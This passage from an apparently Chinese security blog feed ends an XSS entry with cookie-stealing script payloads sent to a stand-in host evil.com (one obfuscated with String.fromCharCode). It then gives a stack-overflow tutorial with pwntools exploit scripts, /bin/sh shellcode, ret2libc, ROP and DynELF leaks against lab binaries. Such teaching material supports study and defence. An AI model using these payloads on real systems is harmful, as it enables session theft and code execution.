class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;<span class="keyword">new</span> Image().src=<span class="string">"http://www.evil.com/steal.php?cookie="</span>+<span class="built_in">escape</span>(<span class="built_in">document</span>.cookie);<span class="xml"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line">&lt;script&gt;<span class="built_in">eval</span>(<span class="string">'new Image().src="http://www.evil.com/steal.php?cookie1="+escape(document.cookie)'</span>)&lt;<span class="regexp">/script&gt;</span></span><br><span class="line"><span class="regexp">&lt;script&gt;eval(String.fromCharCode(110,101,119,32,73,109,97,103,101,40,41,46,115,114,99,61,34,104,116,116,112,58,47,47,119,119,119,46,101,118,97,108,46,99,111,109,47,115,116,101,97,108,46,112,104,112,63,99,111,111,107,105,101,49,61,34,43,101,115,99,97,112,101,40,100,111,99,117,109,101,110,116,46,99,111,111,107,105,101,41))&lt;/</span>script&gt;</span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;location.href = <span class="string">"http://www.evil.com/steal.php?cookie="</span>+<span class="built_in">escape</span>(<span class="built_in">document</span>.cookie)&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure><p><strong>发送同源特定目录的cookie</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;f=document.createElement(&quot;iframe&quot;);f.src=&quot;/sql/index.asp&quot;;document.getElementsByTagName(&quot;body&quot;)[0].appendChild(f);f.onload=function()&#123;new Image().src=&quot;http://www.evil.com/cookie?msg=&quot;+f.contentWindow.document.cookie;&#125;&lt;/script&gt;</span><br></pre></td></tr></table></figure><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p>Web前端黑客技术揭秘</p><p><a href="http://www.w3school.com.cn/tiy/t.asp?f=html_basic" target="_blank" rel="noopener">推荐测试网站</a></p>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> XSS </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>栈溢出stack_overflow</title>
      <link href="//blog/2018/%E6%A0%88%E6%BA%A2%E5%87%BAstack-overflow.html"/>
      <url>//blog/2018/%E6%A0%88%E6%BA%A2%E5%87%BAstack-overflow.html</url>
      
        <content type="html"><![CDATA[<p>程序的栈是从高地址向低地址增长的。<br>程序的堆是从低地址向高地址增长的。</p><h2 id="程序的栈"><a href="#程序的栈" class="headerlink" title="程序的栈"></a>程序的栈</h2><p><img src="../img/pwn/1.png" alt=""></p><p>EIP寄存器不能显式地通过指令修改值，可以通过jmp、call、ret隐式地修改。</p><p>x86架构用字母“e(extended)”作名称前缀，指示寄存器大小为32位；x86_64架构用字母“r”作名称前缀，指示各寄存器大小为64位</p><p>FP(栈帧指针寄存器)–&gt;EBP寄存器，记录栈帧基地址，可以通过它来引用到局部变量和函数参数。</p><p><img src="../img/pwn/2.jpg" alt=""></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">函数调用时入栈顺序为</span><br><span class="line">实参N~1→主调函数返回地址→主调函数帧基指针EBP→被调函数局部变量1~N</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">x86</span><br><span class="line">函数参数在函数返回地址的上方，如上图</span><br><span class="line">x64</span><br><span class="line">x64中前六个参数依次保存在RDI, RSI, RDX, RCX, R8和 R9寄存器里，如果还有更多的参数的话才会保存在栈上。</span><br><span class="line">内存地址不能大于0x00007FFFFFFFFFFF，6个字节长度，否则会抛出异常。</span><br></pre></td></tr></table></figure><h2 id="栈溢出原理"><a href="#栈溢出原理" class="headerlink" title="栈溢出原理"></a>栈溢出原理</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">程序向栈上的某个变量写入数据，而没有控制好写入的长度，导致可以超过该变量申请的长度而覆盖别的内存。</span><br><span class="line">可导致程序崩溃甚至控制程序执行流程。</span><br></pre></td></tr></table></figure><h4 id="简单例子1"><a href="#简单例子1" class="headerlink" title="简单例子1"></a>简单例子1</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;string.h&gt;</span></span><br><span class="line">void success() &#123; puts(<span class="string">"You Hava already controlled it."</span>); &#125;</span><br><span class="line">void vulnerable() &#123;</span><br><span class="line">  char s[<span class="number">12</span>];</span><br><span class="line">  gets(s);</span><br><span class="line">  puts(s);</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line">int main(int argc, char **argv) &#123;</span><br><span class="line">  vulnerable();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>pattern_create</p><p>pattern_offset</p><p>算出偏移，然后，将地址覆盖为success的地址即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># context.log_level = "debug"</span></span><br><span class="line">success_addr = <span class="number">0x08048456</span></span><br><span class="line">p = process(<span class="string">"./stackoverflow1"</span>)</span><br><span class="line"><span class="comment"># print p32(success_addr)</span></span><br><span class="line">payload =  <span class="string">"A"</span>*<span class="number">24</span> + p32(success_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h4 id="简单例子2"><a href="#简单例子2" class="headerlink" title="简单例子2"></a>简单例子2</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line"></span><br><span class="line">void vulnerable_function()&#123;</span><br><span class="line">        char buf[128];</span><br><span class="line">        read(STDIN_FILENO, buf, 256);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main(int argc, char ** argv)&#123;</span><br><span class="line"></span><br><span class="line">        vulnerable_function();</span><br><span class="line">        write(STDOUT_FILENO, &quot;Hello world\n&quot;, 13);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -m32 -z  execstack -no-pie -fno-stack-protector -g  -o stackoverflow2 stackoverflow2.c</span><br></pre></td></tr></table></figure><p>这道题目还是很有意思的，学习蒸米大佬的<a href="https://segmentfault.com/a/1190000005888964" target="_blank" rel="noopener">一步一步学 ROP 之 Linux_x86 篇</a></p><p>发现了点小问题，就是文中提到直接运行程序和用gdb调试程序时，buf地址是不相同的。</p><p>然后，我（问队里大佬）发现用pwntools的process启动的程序也是和直接运行程序的buf地址是不同的。</p><p>文中提到的方法是下面这个栈布局方式</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[shellcode][“AAAAAAAAAAAAAA”….][ret]</span><br></pre></td></tr></table></figure><p>但貌似shellcode的首地址还是比较难搞到的。</p><p>由于限制了输入最多只有256个byte，然后自然而然构造如下方式</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[&quot;\x90\x90\x90...&quot;][shellcode][ret]</span><br></pre></td></tr></table></figure><p>\x90汇编代码是nop，则会有比较大的空间容易命中nop。（虽然前面提到buf地址不同，但相差不是太大）。</p><p>exp如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> pwnlib</span><br><span class="line">context.log_level = <span class="string">"debug"</span></span><br><span class="line">context.arch = <span class="string">"i386"</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">"./stackoverflow2"</span>)</span><br><span class="line"><span class="comment"># p = remote("127.0.0.1",10001)</span></span><br><span class="line"><span class="comment"># pwnlib.gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">ret_addr = <span class="number">0xffffd260</span> + <span class="number">0x30</span></span><br><span class="line"><span class="comment"># shellcode = asm(shellcraft.sh())</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># execve ("/bin/sh")</span></span><br><span class="line"><span class="comment"># xor ecx, ecx</span></span><br><span class="line"><span class="comment"># mul ecx</span></span><br><span class="line"><span class="comment"># push ecx</span></span><br><span class="line"><span class="comment"># push 0x68732f2f   ;; hs//</span></span><br><span class="line"><span class="comment"># push 0x6e69622f   ;; nib/</span></span><br><span class="line"><span class="comment"># mov ebx, esp</span></span><br><span class="line"><span class="comment"># mov al, 11</span></span><br><span class="line"><span class="comment"># int 0x80</span></span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">"\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73"</span></span><br><span class="line">shellcode += <span class="string">"\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0"</span></span><br><span class="line">shellcode += <span class="string">"\x0b\xcd\x80"</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">"\x90"</span> * (<span class="number">140</span> - len(shellcode)) + shellcode + p32(ret_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>然后发现不行，问题在于esp地址。</p><p>我们知道，在ret的时候，esp指着的地址是ret_addr，然后执行nop、nop、nop一直执行到到压栈（压/bin/sh）的时候，就会把跟他相邻的shellcode给覆盖掉，所以不能一直执行下去。(shellcode不同，压栈的数据量可能不同，可以尽可能预留多一些)</p><p>然后，稍微改进下，</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> pwnlib</span><br><span class="line">context.log_level = <span class="string">"debug"</span></span><br><span class="line">context.arch = <span class="string">"i386"</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">"./stackoverflow2"</span>)</span><br><span class="line"><span class="comment"># p = remote("127.0.0.1",10001)</span></span><br><span class="line"><span class="comment"># pwnlib.gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">ret_addr = <span class="number">0xffffd260</span> + <span class="number">0x30</span></span><br><span class="line"><span class="comment"># shellcode = asm(shellcraft.sh())</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># execve ("/bin/sh")</span></span><br><span class="line"><span class="comment"># xor ecx, ecx</span></span><br><span class="line"><span class="comment"># mul ecx</span></span><br><span class="line"><span class="comment"># push ecx</span></span><br><span class="line"><span class="comment"># push 0x68732f2f   ;; hs//</span></span><br><span class="line"><span class="comment"># push 0x6e69622f   ;; nib/</span></span><br><span class="line"><span class="comment"># mov ebx, esp</span></span><br><span class="line"><span class="comment"># mov al, 11</span></span><br><span class="line"><span class="comment"># int 0x80</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># context.terminal = ['tmux', 'splitw', '-v']</span></span><br><span class="line">shellcode = <span class="string">"\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73"</span></span><br><span class="line">shellcode += <span class="string">"\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0"</span></span><br><span class="line">shellcode += <span class="string">"\x0b\xcd\x80"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># shellcode = "\x31\xF6\x56\x48\xBB\x2F\x62\x69\x6E\x2F\x2F\x73\x68\x53\x54\x5F\xF7\xEE\xB0\x3B\x0F\x05"</span></span><br><span class="line">payload = <span class="string">"\x90"</span> * (<span class="number">132</span> - len(shellcode)) + shellcode + <span class="string">"\x90"</span>*<span class="number">8</span> + p32(ret_addr)</span><br><span class="line"><span class="comment"># payload = "\x90" * (100 - len(shellcode)) + shellcode + "\x90"*40 + p32(ret_addr)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line"><span class="comment"># print p.recv()</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h4 id="简单例子3"><a href="#简单例子3" class="headerlink" title="简单例子3"></a>简单例子3</h4><h3 id="Ret2libc-–-Bypass-DEP-通过-ret2libc-绕过-DEP-防护"><a href="#Ret2libc-–-Bypass-DEP-通过-ret2libc-绕过-DEP-防护" class="headerlink" title="Ret2libc – Bypass DEP 通过 ret2libc 绕过 DEP 防护"></a>Ret2libc – Bypass DEP 通过 ret2libc 绕过 DEP 防护</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -m32 -no-pie -fno-stack-protector -g  -o stackoverflow3 stackoverflow2.c</span><br></pre></td></tr></table></figure><p>这里开启了NX，那栈上不能执行代码了。cat /proc/[pid]/maps可以查看得知stack上不能执行。</p><p>没开ASLR，所以，libc中地址是固定的。gdb 调试，p system找到system地址，find “/bin/sh”地址。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">import pwnlib</span><br><span class="line"># context.log_level = &quot;debug&quot;</span><br><span class="line">context.arch = &quot;i386&quot;</span><br><span class="line">p = process(&quot;./stackoverflow3&quot;)</span><br><span class="line"># p = remote(&quot;127.0.0.1&quot;,10001)</span><br><span class="line">#  pwnlib.gdb.attach(p)</span><br><span class="line"></span><br><span class="line">ret_addr =  0xffffd260   #not important</span><br><span class="line">system_addr = 0xf7e0ec60 #0xf7578c60</span><br><span class="line">binsh_addr = 0xf7f4d808  #0xf76b7808</span><br><span class="line"></span><br><span class="line"># execve (&quot;/bin/sh&quot;)</span><br><span class="line"># xor ecx, ecx</span><br><span class="line"># mul ecx</span><br><span class="line"># push ecx</span><br><span class="line"># push 0x68732f2f   ;; hs//</span><br><span class="line"># push 0x6e69622f   ;; nib/</span><br><span class="line"># mov ebx, esp</span><br><span class="line"># mov al, 11</span><br><span class="line"># int 0x80</span><br><span class="line"></span><br><span class="line">shellcode = &quot;\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73&quot;</span><br><span class="line">shellcode += &quot;\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0&quot;</span><br><span class="line">shellcode += &quot;\x0b\xcd\x80&quot;</span><br><span class="line"></span><br><span class="line">payload = &quot;A&quot;* 140 + p32(system_addr)+ p32(ret_addr) + p32(binsh_addr)</span><br><span class="line"></span><br><span class="line"># context.terminal = [&apos;tmux&apos;, &apos;splitw&apos;, &apos;-v&apos;]</span><br><span class="line"># gdb.attach(p)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>这里我们可以分析一下，正常的运行system(“/bin/sh”)的流程是，先push “/bin/sh”，然后，push调用函数的返回地址，然后调用system。</p><p>嗯，所以，我们只需要模仿栈上的布局即可，所以有了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p32(system_addr)+ p32(ret_addr) + p32(binsh_addr)</span><br></pre></td></tr></table></figure><h4 id="简单例子4"><a href="#简单例子4" class="headerlink" title="简单例子4"></a>简单例子4</h4><h3 id="ROP-Bypass-DEP-and-ASLR-通过-ROP-绕过-DEP-和-ASLR-防护"><a href="#ROP-Bypass-DEP-and-ASLR-通过-ROP-绕过-DEP-和-ASLR-防护" class="headerlink" title="ROP - Bypass DEP and ASLR 通过 ROP 绕过 DEP 和 ASLR 防护"></a>ROP - Bypass DEP and ASLR 通过 ROP 绕过 DEP 和 ASLR 防护</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -m32 -no-pie -fno-stack-protector -o stackoverflow4 stackoverflow2.c</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">开启了ASLR和NX(DEP)。所以思路是要先泄露处libc中某些函数的地址，根据这些地址计算偏移，就可以定位到system地址和&quot;/bin/sh&quot;地址。</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> pwnlib</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">"debug"</span></span><br><span class="line">context.arch = <span class="string">"i386"</span></span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>,<span class="string">'splitw'</span>,<span class="string">'-h'</span>]</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">"./stackoverflow4"</span>)</span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">"libc.so"</span>)</span><br><span class="line">elf = ELF(<span class="string">"./stackoverflow4"</span>)</span><br><span class="line"></span><br><span class="line">plt_write = elf.symbols[<span class="string">'write'</span>]</span><br><span class="line">got_write = elf.got[<span class="string">'write'</span>]</span><br><span class="line">vulfun_addr = <span class="number">0x8048526</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"plt_write = "</span> + hex(plt_write)</span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">'A'</span> * <span class="number">140</span> + p32(plt_write) + p32(vulfun_addr) + p32(<span class="number">1</span>) + p32(got_write) + p32(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">p.recv(<span class="number">100</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">p.send(payload1)</span><br><span class="line"></span><br><span class="line">write_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line">system_addr = write_addr - (libc.symbols[<span class="string">'write'</span>] - libc.symbols[<span class="string">'system'</span>])</span><br><span class="line">binsh_addr = write_addr - (libc.symbols[<span class="string">'write'</span>] - next(libc.search(<span class="string">'/bin/sh'</span>)))</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">'A'</span> * <span class="number">140</span> + p32(system_addr) + p32(vulfun_addr) + p32(binsh_addr)</span><br><span class="line"></span><br><span class="line">p.send(payload2)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h4 id="简单例子-5"><a href="#简单例子-5" class="headerlink" title="简单例子 5"></a>简单例子 5</h4><h3 id="Memory-Leak-amp-DynELF-–-在不获取目标libc-so的情况下进行ROP攻击"><a href="#Memory-Leak-amp-DynELF-–-在不获取目标libc-so的情况下进行ROP攻击" class="headerlink" title="Memory Leak &amp; DynELF – 在不获取目标libc.so的情况下进行ROP攻击"></a>Memory Leak &amp; DynELF – 在不获取目标libc.so的情况下进行ROP攻击</h3><p>例子4中提到的方法，需要获取目标机器上面的libc.so，通过泄露函数地址来算偏移，进而确定system函数的地址，来绕过DEP和ASLR。</p><p>在不知道libc.so的情况下，我们可以通过Memory Leak来搜索内存，找到system()的地址。(当然，我们可以尝试泄露两个函数的地址，然后去libc database 里面查版本号)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -m32 -no-pie -fno-stack-protector -o stackoverflow5 stackoverflow2.c</span><br></pre></td></tr></table></figure><p>同样的编译方式，但是我们这次不使用libc.so</p><p>同样的题目，我们可以模仿前面构造的获取write函数地址，构造Memort Leak</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = &apos;A&apos; * 140 + p32(plt_write) + p32(vulfun_addr) + p32(1) + p32(addr) + p32(4)</span><br></pre></td></tr></table></figure><p>DynELF模块只能获取到system()在内存中的地址，但无法获取字符串“/bin/sh”在内存中的地址</p><p>所以，我们需要讲<code>/bin/sh</code>字符串读入内存中。</p><p>写到.bss段中，.bss段是保存全局变量的值的，地址固定，可读可写。</p><blockquote><p>通过readelf可以获得.bss段的地址</p><p>readelf -S ./stackoverflow5</p></blockquote><p>需要注意的是，通过read读入”/bin/sh” 后，我们需要执行system函数，而，read是需要有三个参数的，即</p><blockquote><p>payload = ‘A’*140 + p32(plt_read) + p32(vulfun_addr) + p32(0) + p32(bss_addr) + p32(8)</p></blockquote><p>可以看到，调用完read后，如果要调用后面的函数，则需要pop pop pop ret来弹出那三个参数</p><p>可以用objdump找</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">objdump -d ./stackoverflow5 | grep -A 4 pop</span><br></pre></td></tr></table></figure><blockquote><p>容易找到地址0x8048609</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># context.log_level = "debug"</span></span><br><span class="line">context.arch = <span class="string">"i386"</span></span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>,<span class="string">'splitw'</span>,<span class="string">'-h'</span>]</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">"./stackoverflow5"</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">"./stackoverflow5"</span>)</span><br><span class="line">plt_write = elf.symbols[<span class="string">'write'</span>]</span><br><span class="line">plt_read = elf.symbols[<span class="string">'read'</span>]</span><br><span class="line"></span><br><span class="line">vulfun_addr = <span class="number">0x080484e6</span></span><br><span class="line">pppr_addr = <span class="number">0x8048609</span></span><br><span class="line">bss_addr = <span class="number">0x0804a024</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span><span class="params">(addr)</span>:</span></span><br><span class="line">    payload = <span class="string">'A'</span> * <span class="number">140</span> + p32(plt_write) + p32(vulfun_addr) + p32(<span class="number">1</span>) + p32(addr) + p32(<span class="number">4</span>)</span><br><span class="line">    p.send(payload)</span><br><span class="line">    data = p.recv(<span class="number">4</span>)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"%#x =&gt; %s"</span>%(addr, (data <span class="keyword">or</span> <span class="string">''</span>).encode(<span class="string">'hex'</span>))</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"leak system addr"</span></span><br><span class="line">d = DynELF(leak,elf=ELF(<span class="string">"./stackoverflow5"</span>))</span><br><span class="line">system_addr = d.lookup(<span class="string">'system'</span>,<span class="string">'libc'</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"system_addr = "</span> + hex(system_addr)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">"A"</span> * <span class="number">140</span> + p32(plt_read) + p32(pppr_addr) + p32(<span class="number">0</span>) + p32(bss_addr) + p32(<span class="number">8</span>)</span><br><span class="line">payload += p32(system_addr) + p32(vulfun_addr) + p32(bss_addr)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">p.send(payload)</span><br><span class="line">p.send(<span class="string">"/bin/sh"</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">linux 关闭地址随机化</span><br><span class="line">sudo sh -c &quot;echo 0 &gt; /proc/sys/kernel/randomize_va_space&quot;</span><br><span class="line">原始值为2 </span><br><span class="line"></span><br><span class="line">gcc</span><br><span class="line">-z  execstack 关闭dep/nx</span><br><span class="line">-fno-stack-protector 不开启堆栈溢出保护，即不生成canary</span><br><span class="line">-no-pie  关闭PIE（Position Independent Executable），避免加载基址被打乱</span><br></pre></td></tr></table></figure><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/stackoverflow/stack_intro/" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/pwn/stackoverflow/stack_intro/</a></p><p><a href="https://segmentfault.com/a/1190000005888964" target="_blank" rel="noopener">https://segmentfault.com/a/1190000005888964</a></p><p><a href="http://www.cnblogs.com/clover-toeic/p/3755401.html" target="_blank" rel="noopener">http://www.cnblogs.com/clover-toeic/p/3755401.html</a></p><p><a href="http://www.cnblogs.com/clover-toeic/p/3756668.html" target="_blank" rel="noopener">http://www.cnblogs.com/clover-toeic/p/3756668.html</a></p><p><a href="https://jaq.alibaba.com/community/art/show?articleid=473" target="_blank" 